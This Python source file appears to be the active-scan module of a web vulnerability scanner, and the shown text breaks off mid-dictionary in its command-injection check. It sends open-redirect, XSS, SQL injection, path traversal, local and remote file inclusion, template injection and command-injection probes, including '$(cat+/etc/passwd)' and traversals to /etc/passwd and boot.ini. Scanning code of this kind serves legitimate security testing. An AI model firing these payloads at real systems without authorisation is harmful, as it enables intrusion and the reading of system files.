from __future__ import print_function
from urllib.parse import urlparse
import urllib.request, sys, os, optparse
from socket import timeout
import asyncio, csv, json
from aiohttp import ClientSession, client_exceptions
from ..serializers import ReportsSerializer
from datetime import datetime
from asgiref.sync import sync_to_async
import hashlib, random

OKBLUE = "\033[94m"
OKRED = "\033[91m"
OKGREEN = "\033[92m"
OKORANGE = "\033[93m"
COLOR1 = "\033[95m"
COLOR2 = "\033[96m"
COLOR3 = "\033[90m"
RESET = "\x1b[0m"
VERBOSE = "1"



async def active_scan(
    session,
    full_url,
    base_url,
    http_length_base,
    payload,
    username=None,
    result_list=None,
):
    verbose = "y"
    new_url = base_url
    result_list = []
    request_list = []
    response_list = []

    # Open Redirect 1 ######################################################################################
    result_string = "benign"
    redirect_exploit = urllib.parse.quote("google.com")

    redirect_url = new_url.replace("INJECTX", redirect_exploit)

    parsed = urlparse(redirect_url)
    target = "{uri.scheme}://{uri.netloc}".format(uri=parsed)
    sub_path = redirect_url.split(target)[1]

    async with session.get(redirect_url) as redirect_res:
        http_response = str(await redirect_res.read())
        http_length = len(http_response)
        http_status = redirect_res.status
        http_length_diff = str(http_length_base - http_length)

        if "<title>Google</title>" in http_response:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((redirect_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "Open Redirect",
            "status": redirect_res.status,
            "url": redirect_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {"id": id, "headers_string": json.dumps(dict(redirect_res.headers))}
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    # Open Redirect 2 ######################################################################################
    result_string = "benign"
    redirect_exploit = urllib.parse.quote("//google.com")

    redirect_url = new_url.replace("INJECTX", redirect_exploit)

    sub_path = redirect_url.split(target)[1]

    async with session.get(redirect_url) as redirect_res:
        http_response = str(await redirect_res.read())
        http_length = len(http_response)
        http_status = redirect_res.status
        http_length_diff = str(http_length_base - http_length)

        if "<title>Google</title>" in http_response:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((redirect_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "Open Redirect",
            "status": redirect_res.status,
            "url": redirect_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "","host": target,
        }
        response = {"id": id, "headers_string": json.dumps(dict(redirect_res.headers))}
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    # Open Redirect 3 ######################################################################################
    result_string = "benign"
    redirect_exploit = urllib.parse.quote("https://google.com")

    redirect_url = new_url.replace("INJECTX", redirect_exploit)

    sub_path = redirect_url.split(target)[1]

    async with session.get(redirect_url) as redirect_res:
        http_response = str(await redirect_res.read())
        http_length = len(http_response)
        http_status = redirect_res.status
        http_length_diff = str(http_length_base - http_length)

        if "<title>Google</title>" in http_response:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((redirect_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "Open Redirect",
            "status": redirect_res.status,
            "url": redirect_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {"id": id, "headers_string": json.dumps(dict(redirect_res.headers))}
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    # XSS ######################################################################################
    result_string = "benign"
    res_xss = await session.get(new_url)
    try:

        # http_request = urllib.request.urlopen(new_url)
        http_response = str(await res_xss.read())
        http_length = len(http_response)
        http_status = res_xss.status
        http_length_diff = str(http_length_base - http_length)

        # CHECK FOR REFLECTED VALUE
        if payload in http_response:

            # IF REFLECTED, TRY HEURISTIC STRING
            payload_exploit_unencoded = "</INJECTX>(1)"
            payload_exploit = "%22%3E%3C%2FINJECTX%3E%281%29"
            xss_url = new_url.replace("INJECTX", payload_exploit)

            sub_path = xss_url.split(target)[1]

            res_reflect = await session.get(xss_url)
            try:
                # http_request = urllib.request.urlopen(xss_url)
                http_response = str(await res_reflect.read())
                http_length = len(http_response)
                http_length_diff = str(http_length_base - http_length)
                http_status = res_reflect.status

            except:
                print("XSS Exception1")
                pass

            # CONTINUE TO XSS EXPLOITATION
            if payload_exploit_unencoded in http_response:
                payload_exploit2 = urllib.parse.quote('"><iframe/onload=alert(1)>')
                xss_url2 = new_url.replace("INJECTX", payload_exploit2)
                result_string = "vulnerable"

                now = datetime.now()
                current_time = now.strftime("%Y-%m-%dT%H:%M")
                id = hashlib.md5((xss_url2 + current_time + str(random.random())).encode("utf-8")).hexdigest()
                result = {
                    "id": id,
                    "timestamp": current_time,
                    "username": username,
                    "target": target,
                    "sub_path": sub_path,
                    "vulnerability": "XSS",
                    "status": res_xss.status,
                    "url": xss_url2,
                    "result_string": result_string,
                }
                request = {
                    "id": id,
                    "host": target,
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "User-Agent": "Python/3.9 aiohttp/3.7.3",
                    "body": "",
                }
                response = {
                    "id": id,
                    "headers_string": json.dumps(dict(res_xss.headers)),
                }
                result_list.append(result)
                request_list.append(request)
                response_list.append(response)

                sub_path = xss_url2.split(target)[1]

                res_reflect = await session.get(xss_url2)
                try:
                    # http_request = urllib.request.urlospen(xss_url2)
                    http_response = str(await res_reflect.read())
                    http_length = len(http_response)
                    http_length_diff = str(http_length_base - http_length)
                    http_status = res_reflect.status

                    result_string = "vulnerable"

                    now = datetime.now()
                    current_time = now.strftime("%Y-%m-%dT%H:%M")
                    id = hashlib.md5(
                        (xss_url2 + current_time + str(random.random())).encode("utf-8")
                    ).hexdigest()
                    result = {
                        "id": id,
                        "timestamp": current_time,
                        "username": username,
                        "target": target,
                        "sub_path": sub_path,
                        "vulnerability": "XSS",
                        "status": res_xss.status,
                        "url": xss_url2,
                        "result_string": result_string,
                    }
                    request = {
                        "id": id,
                        "host": target,
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "User-Agent": "Python/3.9 aiohttp/3.7.3",
                        "body": "",
                    }
                    response = {
                        "id": id,
                        "headers_string": json.dumps(dict(res_xss.headers)),
                    }
                    result_list.append(result)
                    request_list.append(request)
                    response_list.append(response)
                except:
                    print("XSS Exception2")
                    pass
        else:
            sub_path = new_url.split(target)[1]

            now = datetime.now()
            current_time = now.strftime("%Y-%m-%dT%H:%M")
            id = hashlib.md5((new_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
            result = {
                "id": id,
                "timestamp": current_time,
                "username": username,
                "target": target,
                "sub_path": sub_path,
                "vulnerability": "XSS",
                "status": res_xss.status,
                "url": new_url,
                "result_string": result_string,
            }
            request = {
                "id": id,
                "host": target,
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate",
                "User-Agent": "Python/3.9 aiohttp/3.7.3",
                "body": "",
            }
            response = {"id": id, "headers_string": json.dumps(dict(res_xss.headers))}
            result_list.append(result)
            request_list.append(request)
            response_list.append(response)
    except Exception as e:
        print(e)
        print("XSS Exception3")
        pass

    # SQLi ######################################################################################
    result_string = "benign"
    sqli_exploit = "'"

    sqli_url = new_url.replace("INJECTX", sqli_exploit)
    sub_path = sqli_url.split(target)[1]

    res_sql = await session.get(sqli_url)
    try:
        # http_request = urllib.request.urlopen(sqli_url)
        http_response = str(await res_sql.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_sql.status

        if "SQL" in http_response or http_status == 500 or http_status == 503:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((sqli_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "SQL Injection",
            "status": res_sql.status,
            "url": sqli_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {"id": id, "headers_string": json.dumps(dict(res_sql.headers))}
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)
    except:
        print("SQLi 1 Exception")
        pass

    # SQLi 2 ######################################################################################
    result_string = "benign"
    sqli_exploit = "\\"

    sqli_url = new_url.replace("INJECTX", sqli_exploit)
    sub_path = sqli_url.split(target)[1]

    res_sql = await session.get(sqli_url)
    try:
        # http_request = urllib.request.urlopen(sqli_url)
        http_response = str(await res_sql.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_sql.status

        if "SQL" in http_response or http_status == 500 or http_status == 503:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((sqli_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "SQL Injection",
            "status": res_sql.status,
            "url": sqli_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {"id": id, "headers_string": json.dumps(dict(res_sql.headers))}
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    except:
        print("SQLi 2 Exception")
        pass

    # Windows Directory Traversal ######################################################################################
    result_string = "benign"
    traversal_exploit = "/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini"

    traversal_url = new_url.replace("INJECTX", traversal_exploit)
    sub_path = traversal_url.split(target)[1]

    res_direc_traversal = await session.get(traversal_url)
    try:

        http_response = str(await res_direc_traversal.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_direc_traversal.status

        if "boot loader" in http_response or "16-bit" in http_response:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((traversal_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "Windows Directory Traversal",
            "status": res_direc_traversal.status,
            "url": traversal_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {
            "id": id,
            "headers_string": json.dumps(dict(res_direc_traversal.headers)),
        }
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    except:
        pass

    # Windows Directory Traversal 2 ######################################################################################
    result_string = "benign"
    traversal_exploit = (
        "/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini%00"
    )

    traversal_url = new_url.replace("INJECTX", traversal_exploit)
    sub_path = traversal_url.split(target)[1]

    res_direc_traversal = await session.get(traversal_url)
    try:

        http_response = str(await res_direc_traversal.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_direc_traversal.status

        if "boot loader" in http_response or "16-bit" in http_response:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((traversal_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "Windows Directory Traversal",
            "status": res_direc_traversal.status,
            "url": traversal_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {
            "id": id,
            "headers_string": json.dumps(dict(res_direc_traversal.headers)),
        }
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    except:
        pass

    # Windows Directory Traversal 3 ######################################################################################
    result_string = "benign"
    traversal_exploit = "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00test.htm"

    traversal_url = new_url.replace("INJECTX", traversal_exploit)
    sub_path = traversal_url.split(target)[1]

    res_direc_traversal = await session.get(traversal_url)
    try:

        http_response = str(await res_direc_traversal.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_direc_traversal.status

        if (
            "boot loader" in http_response
            or "16-bit" in http_response
            or "16-bit" in http_response
        ):
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((traversal_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "Windows Directory Traversal",
            "status": res_direc_traversal.status,
            "url": traversal_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {
            "id": id,
            "headers_string": json.dumps(dict(res_direc_traversal.headers)),
        }
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    except:
        pass

    # Windows Directory Traversal 4 ######################################################################################
    result_string = "benign"
    traversal_exploit = "..%2fWEB-INF%2fweb.xml"

    traversal_url = new_url.replace("INJECTX", traversal_exploit)
    sub_path = traversal_url.split(target)[1]

    res_direc_traversal = await session.get(traversal_url)
    try:

        http_response = str(await res_direc_traversal.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_direc_traversal.status

        if "<web-app" in http_response:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((traversal_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "Windows Directory Traversal",
            "status": res_direc_traversal.status,
            "url": traversal_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {
            "id": id,
            "headers_string": json.dumps(dict(res_direc_traversal.headers)),
        }
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    except:
        pass

    # Linux Directory Traversal ######################################################################################
    result_string = "benign"
    traversal_exploit = "/../../../../../../../../../../../../../../../../../etc/passwd"

    traversal_url = new_url.replace("INJECTX", traversal_exploit)
    sub_path = traversal_url.split(target)[1]

    # res_direc_traversal = await session.get(traversal_url)
    try:
        http_request = urllib.request.urlopen(traversal_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()

        if "root:" in http_response:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((traversal_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "Linux Directory Traversal",
            "status": http_status,
            "url": traversal_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {"id": id, "headers_string": json.dumps(dict(http_request.headers))}
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    except:
        pass

    # Linux Directory Traversal 2 ######################################################################################
    result_string = "benign"
    traversal_exploit = (
        "/../../../../../../../../../../../../../../../../../etc/passwd%00"
    )

    traversal_url = new_url.replace("INJECTX", traversal_exploit)
    sub_path = traversal_url.split(target)[1]

    # res_direc_traversal = await session.get(traversal_url)
    try:
        http_request = urllib.request.urlopen(traversal_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()

        if "root:" in http_response:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((traversal_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "Linux Directory Traversal",
            "status": http_status,
            "url": traversal_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {"id": id, "headers_string": json.dumps(dict(http_request.headers))}
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    except:
        pass

    # LFI Check ######################################################################################
    result_string = "benign"
    lfi_exploit = "/etc/passwd"

    lfi_url = new_url.replace("INJECTX", lfi_exploit)
    sub_path = lfi_url.split(target)[1]

    res_lfi = await session.get(lfi_url)

    try:

        # http_request = urllib.request.urlopen(rfi_url)
        http_response = str(await res_lfi.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_lfi.status

        if "root:" in http_response:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((lfi_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "LFI Check",
            "status": http_status,
            "url": lfi_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {"id": id, "headers_string": json.dumps(dict(res_lfi.headers))}
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    except:
        pass

    # LFI Check 2 ######################################################################################
    result_string = "benign"
    lfi_exploit = "/etc/passwd%00"

    lfi_url = new_url.replace("INJECTX", lfi_exploit)
    sub_path = lfi_url.split(target)[1]

    res_lfi = await session.get(lfi_url)
    try:

        # http_request = urllib.request.urlopen(rfi_url)
        http_response = str(await res_lfi.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_lfi.status

        if "root:" in http_response:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((lfi_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "LFI Check",
            "status": http_status,
            "url": lfi_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {"id": id, "headers_string": json.dumps(dict(res_lfi.headers))}
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    except:
        pass

    # LFI Check 3 ######################################################################################
    result_string = "benign"
    lfi_exploit = "C:\\boot.ini"

    lfi_url = new_url.replace("INJECTX", lfi_exploit)
    sub_path = lfi_url.split(target)[1]

    res_rfi = await session.get(lfi_url)
    try:

        http_response = str(await res_lfi.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_lfi.status

        if "boot loader" in http_response or "16-bit" in http_response:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((lfi_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "LFI Check",
            "status": http_status,
            "url": lfi_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {"id": id, "headers_string": json.dumps(dict(res_lfi.headers))}
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    except:
        pass

    # LFI Check 4 ######################################################################################
    result_string = "benign"
    lfi_exploit = "C:\\boot.ini%00"

    lfi_url = new_url.replace("INJECTX", lfi_exploit)
    sub_path = lfi_url.split(target)[1]

    res_rfi = await session.get(lfi_url)
    try:

        http_response = str(await res_lfi.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_lfi.status

        if "boot loader" in http_response or "16-bit" in http_response:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((lfi_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "LFI Check",
            "status": http_status,
            "url": lfi_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {"id": id, "headers_string": json.dumps(dict(res_lfi.headers))}
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    except:
        pass

    # RFI Check ######################################################################################
    result_string = "benign"
    rfi_exploit = "hTtP://tests.arachni-scanner.com/rfi.md5.txt"

    rfi_url = new_url.replace("INJECTX", rfi_exploit)
    sub_path = rfi_url.split(target)[1]

    res_rfi = await session.get(rfi_url)
    try:

        http_response = str(await res_rfi.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_rfi.status

        if "705cd559b16e6946826207c2199bd890" in http_response:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((rfi_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "RFI Check",
            "status": http_status,
            "url": rfi_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {"id": id, "headers_string": json.dumps(dict(res_rfi.headers))}
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    except:
        pass

    # RFI Check 2 ######################################################################################
    result_string = "benign"
    rfi_exploit = "hTtP://tests.arachni-scanner.com/rfi.md5.txt%00"

    rfi_url = new_url.replace("INJECTX", rfi_exploit)
    sub_path = rfi_url.split(target)[1]

    res_rfi = await session.get(rfi_url)
    try:

        http_response = str(await res_rfi.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_rfi.status

        if "705cd559b16e6946826207c2199bd890" in http_response:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((rfi_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "RFI Check",
            "status": http_status,
            "url": rfi_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {"id": id, "headers_string": json.dumps(dict(res_rfi.headers))}
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    except:
        pass

    # IDOR Check ######################################################################################
    # idor_list = [1,2,3]
    # idor_length_list = []
    # for idor in idor_list:
    #  try:
    #    idor_exploit = str(idor)
    #    # print COLOR2 + "[i] Trying Payload: " + str(idor) + RESET
    #    idor_url = new_url.replace("INJECTX", idor_exploit)
    #    http_request = urllib.request.urlopen(idor_url)
    #    http_response = http_request.read()
    #    http_length = len(http_response)
    #    http_status = http_request.getcode()
    #    idor_length_list.append(http_length)
    #    http_length_diff = str(http_length_base - http_length)
    #    #print(COLOR2 + "[i] New URL: " + idor_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
    #
    #    if (idor_length_list[0] != idor_length_list[1]) or (idor_length_list[1] != idor_length_list[2]) or (idor_length_list[0] != idor_length_list[2]):
    #      print(OKRED + "[+] Possible IDOR Found! " + RESET)
    #      print(OKRED + "[+] Vulnerable URL: " + idor_url + RESET)
    #      print(OKGREEN + "[c] Exploit Command: curl -s '" + idor_url + "'")
    #    #else:
    #      #print(COLOR1 + "[F] IDOR Failed." + RESET)
    #  except:
    #    pass

    # Buffer Overflow Check ######################################################################################
    # try:
    #  overflow_exploit = "INJECTX" * 4000
    #  # print COLOR2 + "[i] Trying Payload: " + "INJECTXINJECTXINJECTXINJECTXINJECTXINJECTX..." + RESET
    #  overflow_url = new_url.replace("INJECTX", overflow_exploit)
    #  http_request = urllib.request.urlopen(overflow_url)
    #  http_response = http_request.read()
    #  http_length = len(http_response)
    #  http_status = http_request.getcode()
    #  print COLOR2 + "[i] New URL: " + new_url + "INJECTXINJECTXINJECTXINJECTXINJECTXINJECTX..." + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + RESET
    #
    #  if http_status != 200 or http_status != 414 or http_status != 413:
    #    print OKGREEN + "[+] Possible Buffer Overflow Found! " + RESET
    #  else:
    #    print COLOR1 + "[F] Buffer Overflow Failed." + RESET
    # except:
    #  pass
    #

    # SSTI Check ######################################################################################
    result_string = "benign"
    ssti_exploit = urllib.parse.quote("{{1336%2B1}}")
    ssti_url = new_url.replace("INJECTX", ssti_exploit)
    sub_path = ssti_url.split(target)[1]

    res_ssti = await session.get(ssti_url)
    try:

        http_response = str(await res_ssti.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_ssti.status

        if "1337" in http_response:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((ssti_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "SSTI Check",
            "status": http_status,
            "url": ssti_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {"id": id, "headers_string": json.dumps(dict(res_ssti.headers))}
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    except:
        pass

    # SSTI Check 2 ######################################################################################
    result_string = "benign"
    ssti_exploit = urllib.parse.quote("1336+1")

    ssti_url = new_url.replace("INJECTX", ssti_exploit)
    sub_path = ssti_url.split(target)[1]

    res_ssti = await session.get(ssti_url)
    try:

        http_response = str(await res_ssti.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_ssti.status

        if "1337" in http_response:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((ssti_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "SSTI Check",
            "status": http_status,
            "url": ssti_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {"id": id, "headers_string": json.dumps(dict(res_ssti.headers))}
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    except:
        pass

    # RCE Linux Check ######################################################################################
    result_string = "benign"
    rce_exploit = urllib.parse.quote("$(cat+/etc/passwd)")

    rce_url = new_url.replace("INJECTX", rce_exploit)
    sub_path = rce_url.split(target)[1]

    res_rce = await session.get(rce_url)
    try:

        http_response = str(await res_rce.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_rce.status

        if "root:" in http_response:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((rce_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "RCE Linux Check",
            "status": http_status,
            "url": rce_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
